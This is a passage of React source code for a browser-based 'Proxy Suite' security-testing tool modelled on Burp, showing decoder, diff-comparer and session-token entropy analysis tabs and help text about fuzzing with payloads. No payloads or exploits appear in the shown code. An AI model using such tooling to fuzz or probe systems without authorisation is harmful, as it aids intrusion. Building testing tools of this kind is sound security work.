          <AlertTriangle size={14} style={{ color: '#FBBF24', flexShrink: 0 }} />
          <span style={{ fontFamily: mono, fontSize: 10, color: '#FBBF24' }}>
            Browser-based requests are subject to CORS restrictions. For full intruder functionality, use a proxy tool or server-side relay.
          </span>
        </div>
      </Card>
    </div>
  );
}

// ─── Tab: Decoder ───

function DecoderTab() {
  const [input, setInput] = useState('');
  const [chain, setChain] = useState([]);
  const [hashResults, setHashResults] = useState({});

  const applyOp = useCallback((op) => {
    const lastOutput = chain.length ? chain[chain.length - 1].output : input;
    let output;
    if (op.label === 'Smart Decode') {
      output = smartDecode(lastOutput);
    } else {
      output = op.fn(lastOutput);
    }
    setChain(prev => [...prev, { label: op.label, input: lastOutput, output }]);
  }, [input, chain]);

  const undoLast = () => setChain(prev => prev.slice(0, -1));
  const clearAll = () => { setChain([]); setHashResults({}); };

  const computeHashes = async () => {
    const text = chain.length ? chain[chain.length - 1].output : input;
    const [sha1, sha256] = await Promise.all([hashSHA1(text), hashSHA256(text)]);
    setHashResults({ 'SHA-1': sha1, 'SHA-256': sha256 });
  };

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 14 }}>
      <Card>
        <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
            <span style={{ fontFamily: heading, fontSize: 13, fontWeight: 600, color: '#D1D5DB' }}>Input</span>
            <div style={{ display: 'flex', gap: 6 }}>
              <button onClick={undoLast} disabled={!chain.length} style={{ ...btnGhost, opacity: chain.length ? 1 : 0.4 }}>
                <RotateCcw size={11} /> Undo
              </button>
              <button onClick={clearAll} style={btnGhost}><Trash2 size={11} /> Clear All</button>
            </div>
          </div>
          <textarea
            value={input}
            onChange={(e) => { setInput(e.target.value); setChain([]); }}
            placeholder="Paste encoded data here..."
            spellCheck={false}
            style={{ ...codeBlock, minHeight: 100, resize: 'vertical', outline: 'none', width: '100%' }}
          />
        </div>
      </Card>

      {/* Operation buttons */}
      <Card>
        <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
          <span style={labelStyle}>Apply Operation</span>
          <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap' }}>
            {DECODE_OPS.map((op) => (
              <button key={op.label} onClick={() => applyOp(op)} style={{ ...btnGhost, fontSize: 10 }}>
                {op.label}
              </button>
            ))}
          </div>
          <div style={{ borderTop: '1px solid rgba(255,255,255,0.04)', paddingTop: 10, display: 'flex', gap: 6, alignItems: 'center' }}>
            <span style={labelStyle}>Hash</span>
            <button onClick={computeHashes} style={{ ...btnPrimary, fontSize: 10 }}>
              <Hash size={11} /> SHA-1 & SHA-256
            </button>
          </div>
        </div>
      </Card>

      {/* Chain results */}
      {chain.map((step, i) => (
        <Card key={i} style={{ borderLeft: `3px solid ${accent}` }}>
          <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
            <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
              <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                <span style={{ fontFamily: mono, fontSize: 10, fontWeight: 700, color: accent, background: 'rgba(167,139,250,0.1)', padding: '2px 8px', borderRadius: 4 }}>
                  Step {i + 1}
                </span>
                <span style={{ fontFamily: mono, fontSize: 10, color: '#9CA3AF' }}>{step.label}</span>
              </div>
              <CopyButton text={step.output} />
            </div>
            <pre style={{ ...codeBlock, maxHeight: 200, overflow: 'auto' }}>{step.output}</pre>
          </div>
        </Card>
      ))}

      {/* Hash results */}
      {Object.keys(hashResults).length > 0 && (
        <Card style={{ borderLeft: '3px solid #6EE7B7' }}>
          <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
            <span style={{ fontFamily: heading, fontSize: 13, fontWeight: 600, color: '#6EE7B7' }}>Hash Output</span>
            {Object.entries(hashResults).map(([algo, hash]) => (
              <div key={algo} style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                <span style={{ fontFamily: mono, fontSize: 10, fontWeight: 600, color: '#6B7280', minWidth: 55 }}>{algo}</span>
                <pre style={{ ...codeBlock, flex: 1, fontSize: 10, padding: '8px 12px' }}>{hash}</pre>
                <CopyButton text={hash} />
              </div>
            ))}
          </div>
        </Card>
      )}
    </div>
  );
}

// ─── Tab: Comparer ───

function ComparerTab() {
  const [textA, setTextA] = useState('');
  const [textB, setTextB] = useState('');
  const [mode, setMode] = useState('lines');

  const lineDiff = useMemo(() => diffLines(textA, textB), [textA, textB]);
  const wordDiff = useMemo(() => diffWords(textA, textB), [textA, textB]);

  const stats = useMemo(() => {
    const lenDiff = (textB.length || 0) - (textA.length || 0);
    const linesA = textA.split('\n').length;
    const linesB = textB.split('\n').length;
    const changed = lineDiff.filter(d => d.type !== 'same').length;
    return { lenDiff, linesA, linesB, changed };
  }, [textA, textB, lineDiff]);

  const diffColor = { same: 'transparent', added: 'rgba(110,231,183,0.08)', removed: 'rgba(251,113,133,0.08)', changed: 'rgba(251,191,36,0.08)' };
  const diffTextColor = { same: '#D1D5DB', added: '#6EE7B7', removed: '#FB7185', changed: '#FBBF24' };

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 14 }}>
      <div style={{ display: 'flex', gap: 14, flexWrap: 'wrap' }}>
        <Card style={{ flex: '1 1 340px', minWidth: 0 }}>
          <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
            <span style={{ fontFamily: heading, fontSize: 13, fontWeight: 600, color: '#FB7185' }}>Response A</span>
            <textarea
              value={textA}
              onChange={(e) => setTextA(e.target.value)}
              placeholder="Paste response A..."
              spellCheck={false}
              style={{ ...codeBlock, minHeight: 180, resize: 'vertical', outline: 'none', width: '100%' }}
            />
          </div>
        </Card>
        <Card style={{ flex: '1 1 340px', minWidth: 0 }}>
          <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
            <span style={{ fontFamily: heading, fontSize: 13, fontWeight: 600, color: '#6EE7B7' }}>Response B</span>
            <textarea
              value={textB}
              onChange={(e) => setTextB(e.target.value)}
              placeholder="Paste response B..."
              spellCheck={false}
              style={{ ...codeBlock, minHeight: 180, resize: 'vertical', outline: 'none', width: '100%' }}
            />
          </div>
        </Card>
      </div>

      {/* Stats */}
      {(textA || textB) && (
        <div style={{ display: 'flex', gap: 10, flexWrap: 'wrap' }}>
          {[
            { label: 'Size Diff', value: `${stats.lenDiff >= 0 ? '+' : ''}${stats.lenDiff} bytes`, color: stats.lenDiff === 0 ? '#6EE7B7' : '#FBBF24' },
            { label: 'Lines A', value: stats.linesA, color: '#FB7185' },
            { label: 'Lines B', value: stats.linesB, color: '#6EE7B7' },
            { label: 'Changed', value: `${stats.changed} lines`, color: stats.changed === 0 ? '#6EE7B7' : '#FBBF24' },
          ].map(s => (
            <div key={s.label} style={{
              background: '#0B0F18', borderRadius: 8, padding: '10px 16px',
              border: '1px solid rgba(255,255,255,0.04)', display: 'flex', flexDirection: 'column', gap: 2,
            }}>
              <span style={labelStyle}>{s.label}</span>
              <span style={{ fontFamily: mono, fontSize: 13, fontWeight: 700, color: s.color }}>{s.value}</span>
            </div>
          ))}
        </div>
      )}

      {/* Diff mode toggle */}
      <div style={{ display: 'flex', gap: 6 }}>
        {['lines', 'words'].map(m => (
          <button key={m} onClick={() => setMode(m)} style={{
            ...btnBase, fontSize: 10,
            background: mode === m ? 'rgba(167,139,250,0.15)' : 'transparent',
            color: mode === m ? accent : '#6B7280',
            border: `1px solid ${mode === m ? 'rgba(167,139,250,0.3)' : 'rgba(255,255,255,0.06)'}`,
          }}>
            {m === 'lines' ? 'Line Diff' : 'Word Diff'}
          </button>
        ))}
      </div>

      {/* Diff Output */}
      {(textA || textB) && (
        <Card>
          <div style={{ display: 'flex', flexDirection: 'column', gap: 4 }}>
            <span style={{ fontFamily: heading, fontSize: 13, fontWeight: 600, color: '#D1D5DB', marginBottom: 6 }}>Diff Output</span>
            {mode === 'lines' ? (
              <pre style={{ ...codeBlock, maxHeight: 400, overflow: 'auto' }}>
                {lineDiff.map((d, i) => {
                  if (d.type === 'same') return <div key={i} style={{ padding: '1px 0' }}><span style={{ color: '#4B5563', marginRight: 8 }}>{String(d.num).padStart(3)}</span>{d.line}</div>;
                  if (d.type === 'added') return <div key={i} style={{ background: diffColor.added, padding: '1px 0' }}><span style={{ color: diffTextColor.added, marginRight: 4 }}>+ </span><span style={{ color: diffTextColor.added }}>{d.line}</span></div>;
                  if (d.type === 'removed') return <div key={i} style={{ background: diffColor.removed, padding: '1px 0' }}><span style={{ color: diffTextColor.removed, marginRight: 4 }}>- </span><span style={{ color: diffTextColor.removed }}>{d.line}</span></div>;
                  return (
                    <div key={i}>
                      <div style={{ background: diffColor.removed, padding: '1px 0' }}><span style={{ color: diffTextColor.removed, marginRight: 4 }}>- </span><span style={{ color: diffTextColor.removed }}>{d.lineA}</span></div>
                      <div style={{ background: diffColor.added, padding: '1px 0' }}><span style={{ color: diffTextColor.added, marginRight: 4 }}>+ </span><span style={{ color: diffTextColor.added }}>{d.lineB}</span></div>
                    </div>
                  );
                })}
              </pre>
            ) : (
              <pre style={{ ...codeBlock, maxHeight: 400, overflow: 'auto' }}>
                {wordDiff.map((d, i) => {
                  if (d.type === 'same') return <span key={i}>{d.word}</span>;
                  if (d.type === 'added') return <span key={i} style={{ background: 'rgba(110,231,183,0.15)', color: '#6EE7B7', borderRadius: 2, padding: '0 2px' }}>{d.word}</span>;
                  if (d.type === 'removed') return <span key={i} style={{ background: 'rgba(251,113,133,0.15)', color: '#FB7185', textDecoration: 'line-through', borderRadius: 2, padding: '0 2px' }}>{d.word}</span>;
                  return (
                    <span key={i}>
                      <span style={{ background: 'rgba(251,113,133,0.15)', color: '#FB7185', textDecoration: 'line-through', borderRadius: 2, padding: '0 2px' }}>{d.wordA}</span>
                      <span style={{ background: 'rgba(110,231,183,0.15)', color: '#6EE7B7', borderRadius: 2, padding: '0 2px' }}>{d.wordB}</span>
                    </span>
                  );
                })}
              </pre>
            )}
          </div>
        </Card>
      )}
    </div>
  );
}

// ─── Tab: Sequencer ───

function SequencerTab() {
  const [tokensRaw, setTokensRaw] = useState('');
  const [analysis, setAnalysis] = useState(null);

  const handleAnalyze = () => {
    const tokens = tokensRaw.split('\n').map(t => t.trim()).filter(Boolean);
    if (tokens.length < 2) return;
    setAnalysis(analyzeTokens(tokens));
  };

  const entropyColor = (e) => {
    if (e < 1) return '#FB7185';
    if (e < 2) return '#FBBF24';
    if (e < 3) return '#7DD3FC';
    return '#6EE7B7';
  };

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 14 }}>
      <Card>
        <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
          <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center' }}>
            <span style={{ fontFamily: heading, fontSize: 13, fontWeight: 600, color: '#D1D5DB' }}>
              Token Input
            </span>
            <button onClick={handleAnalyze} style={btnPrimary}>
              <BarChart3 size={12} /> Analyze
            </button>
          </div>
          <span style={{ fontFamily: mono, fontSize: 10, color: '#6B7280' }}>
            Paste session tokens, one per line (minimum 2, recommend 20+)
          </span>
          <textarea
            value={tokensRaw}
            onChange={(e) => setTokensRaw(e.target.value)}
            placeholder={'e.g.\nabc123def456\nabc124def457\nabc125def458\n...'}
            spellCheck={false}
            style={{ ...codeBlock, minHeight: 160, resize: 'vertical', outline: 'none', width: '100%' }}
          />
        </div>
      </Card>

      {analysis && (
        <>
          {/* Verdict */}
          <Card style={{ borderLeft: `3px solid ${analysis.overallEntropy > 3.5 && !analysis.patterns.length ? '#6EE7B7' : '#FB7185'}` }}>
            <div style={{ display: 'flex', alignItems: 'center', gap: 10 }}>
              <span style={{
                fontFamily: mono, fontSize: 12, fontWeight: 700,
                color: analysis.overallEntropy > 3.5 && !analysis.patterns.length ? '#6EE7B7' : '#FB7185',
              }}>
                {analysis.verdict}
              </span>
            </div>
          </Card>

          {/* Stats Grid */}
          <div style={{ display: 'flex', gap: 10, flexWrap: 'wrap' }}>
            {[
              { label: 'Total Tokens', value: analysis.total, color: '#D1D5DB' },
              { label: 'Unique', value: `${analysis.unique} (${analysis.uniquePct}%)`, color: analysis.uniquePct === '100.0' ? '#6EE7B7' : '#FBBF24' },
              { label: 'Avg Length', value: analysis.avgLen, color: '#7DD3FC' },
              { label: 'Min / Max', value: `${analysis.minLen} / ${analysis.maxLen}`, color: '#9CA3AF' },
              { label: 'Charset', value: analysis.detectedCharset, color: accent },
              { label: 'Entropy', value: analysis.overallEntropy, color: entropyColor(parseFloat(analysis.overallEntropy)) },
            ].map(s => (
              <div key={s.label} style={{
                background: '#0B0F18', borderRadius: 8, padding: '10px 16px',
                border: '1px solid rgba(255,255,255,0.04)', display: 'flex', flexDirection: 'column', gap: 2, minWidth: 100,
              }}>
                <span style={labelStyle}>{s.label}</span>
                <span style={{ fontFamily: mono, fontSize: 13, fontWeight: 700, color: s.color }}>{s.value}</span>
              </div>
            ))}
          </div>

          {/* Patterns */}
          {analysis.patterns.length > 0 && (
            <Card style={{ borderLeft: '3px solid #FBBF24' }}>
              <div style={{ display: 'flex', flexDirection: 'column', gap: 6 }}>
                <span style={{ fontFamily: heading, fontSize: 13, fontWeight: 600, color: '#FBBF24' }}>Detected Patterns</span>
                {analysis.patterns.map((p, i) => (
                  <div key={i} style={{ display: 'flex', alignItems: 'center', gap: 6 }}>
                    <AlertTriangle size={12} style={{ color: '#FBBF24', flexShrink: 0 }} />
                    <span style={{ fontFamily: mono, fontSize: 11, color: '#FBBF24' }}>{p}</span>
                  </div>
                ))}
              </div>
            </Card>
          )}

          {/* Entropy Heatmap */}
          <Card>
            <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
              <span style={{ fontFamily: heading, fontSize: 13, fontWeight: 600, color: '#D1D5DB' }}>
                Entropy Heatmap (per character position)
              </span>
              <div style={{ display: 'flex', gap: 2, flexWrap: 'wrap', alignItems: 'flex-end' }}>
                {analysis.positionEntropy.map((e, i) => {
                  const maxE = Math.max(...analysis.positionEntropy, 1);
                  const height = Math.max(8, (e / maxE) * 60);
                  return (
                    <div key={i} style={{ display: 'flex', flexDirection: 'column', alignItems: 'center', gap: 2 }}>
                      <div style={{
                        width: 14, height, borderRadius: 3,
                        background: entropyColor(e),
                        opacity: 0.3 + (e / maxE) * 0.7,
                        transition: 'all 0.2s ease',
                      }}
                        title={`Position ${i}: entropy ${e.toFixed(3)}`}
                      />
                      <span style={{ fontFamily: mono, fontSize: 7, color: '#4B5563' }}>{i}</span>
                    </div>
                  );
                })}
              </div>
              <div style={{ display: 'flex', gap: 12, marginTop: 4 }}>
                {[
                  { color: '#FB7185', label: 'Low (predictable)' },
                  { color: '#FBBF24', label: 'Medium' },
                  { color: '#7DD3FC', label: 'Good' },
                  { color: '#6EE7B7', label: 'High (random)' },
                ].map(l => (
                  <div key={l.label} style={{ display: 'flex', alignItems: 'center', gap: 4 }}>
                    <div style={{ width: 8, height: 8, borderRadius: 2, background: l.color }} />
                    <span style={{ fontFamily: mono, fontSize: 9, color: '#6B7280' }}>{l.label}</span>
                  </div>
                ))}
              </div>
            </div>
          </Card>

          {/* Character Frequency (first 10 positions) */}
          <Card>
            <div style={{ display: 'flex', flexDirection: 'column', gap: 10 }}>
              <span style={{ fontFamily: heading, fontSize: 13, fontWeight: 600, color: '#D1D5DB' }}>
                Character Frequency (first {Math.min(10, analysis.positionFreqs.length)} positions)
              </span>
              <div style={{ overflowX: 'auto' }}>
                <div style={{ display: 'flex', gap: 8 }}>
                  {analysis.positionFreqs.slice(0, 10).map((freq, pos) => {
                    const sorted = Object.entries(freq).sort((a, b) => b[1] - a[1]).slice(0, 5);
                    const total = Object.values(freq).reduce((a, b) => a + b, 0);
                    return (
                      <div key={pos} style={{
                        background: '#0B0F18', borderRadius: 6, padding: '8px 10px', minWidth: 70,
                        border: '1px solid rgba(255,255,255,0.04)', display: 'flex', flexDirection: 'column', gap: 4,
                      }}>
                        <span style={{ fontFamily: mono, fontSize: 9, fontWeight: 700, color: accent }}>Pos {pos}</span>
                        {sorted.map(([char, count]) => (
                          <div key={char} style={{ display: 'flex', justifyContent: 'space-between', gap: 8 }}>
                            <span style={{ fontFamily: mono, fontSize: 9, color: '#D1D5DB' }}>'{char}'</span>
                            <span style={{ fontFamily: mono, fontSize: 9, color: '#6B7280' }}>{((count/total)*100).toFixed(0)}%</span>
                          </div>
                        ))}
                      </div>
                    );
                  })}
                </div>
              </div>
            </div>
          </Card>
        </>
      )}
    </div>
  );
}

// ─── Main Component ───

const TABS = [
  { id: 'repeater', label: 'Repeater', icon: Send },
  { id: 'intruder', label: 'Intruder', icon: Play },
  { id: 'decoder', label: 'Decoder', icon: Layers },
  { id: 'comparer', label: 'Comparer', icon: ArrowRightLeft },
  { id: 'sequencer', label: 'Sequencer', icon: BarChart3 },
];

export default function ProxySuite() {
  const [activeTab, setActiveTab] = useState('repeater');

  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 16 }}>
      {/* Header */}
      <div style={{ display: 'flex', alignItems: 'center', gap: 14 }}>
        <div style={{
          width: 36, height: 36, borderRadius: 10,
          background: 'rgba(167,139,250,0.1)',
          border: '1px solid rgba(167,139,250,0.2)',
          display: 'flex', alignItems: 'center', justifyContent: 'center',
        }}>
          <Radar size={20} style={{ color: accent }} />
        </div>
        <span style={{ fontFamily: heading, fontSize: 20, fontWeight: 700, color: '#F3F4F6' }}>
          Proxy Suite
        </span>
        <ToolHelp title="Proxy Suite" description="Burp-like HTTP proxy tools: repeater for manual requests, intruder for fuzzing, decoder chain, and sequencer." steps={["Use Repeater to craft and send HTTP requests","Use Intruder to fuzz parameters with payloads","Use Decoder to chain encode/decode operations","Use Sequencer to analyze token randomness"]} tips={["Mark injection points with section signs in Intruder","The decoder chain supports multiple transform steps","Sequencer helps identify weak session tokens"]} />
      </div>

      {/* Tab Bar */}
      <div style={{ display: 'flex', gap: 4, borderBottom: '1px solid rgba(255,255,255,0.04)', paddingBottom: 1 }}>
        {TABS.map(tab => {
          const Icon = tab.icon;
          const active = activeTab === tab.id;
          return (
            <button
              key={tab.id}
              onClick={() => setActiveTab(tab.id)}
              style={{
                fontFamily: mono,
                fontSize: 11,
                fontWeight: 600,
                padding: '10px 18px',
                border: 'none',
                borderBottom: active ? `2px solid ${accent}` : '2px solid transparent',
                background: active ? 'rgba(167,139,250,0.06)' : 'transparent',
                color: active ? accent : '#6B7280',
                cursor: 'pointer',
                display: 'flex',
                alignItems: 'center',
                gap: 6,
                borderRadius: '6px 6px 0 0',
                transition: 'all 0.15s ease',
              }}
            >
              <Icon size={13} />
              {tab.label}
            </button>
          );
        })}
      </div>

      {/* Tab Content */}
      {activeTab === 'repeater' && <RepeaterTab />}
      {activeTab === 'intruder' && <IntruderTab />}
      {activeTab === 'decoder' && <DecoderTab />}
      {activeTab === 'comparer' && <ComparerTab />}
      {activeTab === 'sequencer' && <SequencerTab />}
    </div>
  );
}
